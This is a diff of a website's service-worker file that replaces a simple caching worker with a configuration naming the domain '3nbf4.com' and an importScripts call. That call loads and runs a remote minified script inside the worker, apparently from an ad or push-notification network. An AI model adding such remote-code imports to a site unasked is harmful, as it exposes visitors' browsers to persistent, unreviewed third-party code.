@@ -1,9 +1,6 @@
-const CACHE_NAME = "vooxor-v1";
-
-self.addEventListener("install", () => {
-  self.skipWaiting();
-});
-
-self.addEventListener("activate", (event) => {
-  event.waitUntil(self.clients.claim());
-});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11869723
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
